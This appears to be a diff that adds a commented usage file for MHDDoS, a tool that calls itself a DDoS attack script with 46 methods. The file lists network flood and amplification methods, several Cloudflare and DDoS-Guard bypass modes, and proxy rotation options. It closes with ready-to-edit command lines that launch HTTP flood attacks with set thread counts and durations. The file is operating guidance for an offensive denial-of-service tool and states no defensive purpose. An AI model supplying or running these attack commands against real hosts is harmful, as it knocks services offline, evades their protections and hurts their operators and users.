@@ -1,0 +1,33 @@
+# * MHDDoS - DDoS Attack Script With 46 Methods
+# Note: If the Proxy list is empty, the attack will run without proxies
+#       If the Proxy file doesn't exist, the script will download proxies and check them.
+#       Proxy Type 0 = All in config.json
+#       SocksTypes:
+#          - 6 = RANDOM
+#          - 5 = SOCKS5
+#          - 4 = SOCKS4
+#          - 1 = HTTP
+#          - 0 = ALL
+#  > Methods:
+#  - Layer4
+#  | SYN, VSE, CPS, DNS, NTP, RDP, CONNECTION, UDP, ARD, TCP, MCBOT, MINECRAFT, MEM, CHAR | 14 Methods
+#  - Layer7
+#  | BOMB, PPS, HEAD, SLOW, STRESS, APACHE, COOKIE, EVEN, DYN, CFBUAM, DGB, GSB, BYPASS, GET, NULL, POST, XMLRPC, DOWNLOADER, BOT, AVB, OVH, CFB | 22 Methods
+#  - Tools
+#  | DNS, DSTAT, PING, CHECK, INFO, CFIP, TSSRV | 7 Methods
+#  - Others
+#  | TOOLS, HELP, STOP | 3 Methods
+#  - All 46 Methods
+# 
+# Example:
+#    L7: python3 MHDDoS/start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>
+#    L4: python3 MHDDoS/start.py <method> <ip:port> <threads> <duration>
+#    L4 Proxied: python3 MHDDoS/start.py <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
+#    L4 Amplification: python3 MHDDoS/start.py <method> <ip:port> <threads> <duration> <reflector file (only use with Amplification)>
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Examples:
+#HEAD http://example.com:8080 0 5 socks5.txt 100 3600 debug=true
+#CFB https://example.com 0 5 socks5.txt 100 3600 debug=true
+#SLOW https://example.com 0 5 socks5.txt 100 3600 debug=true
+#GET https://example.com 0 5 socks5.txt 100 3600 debug=true
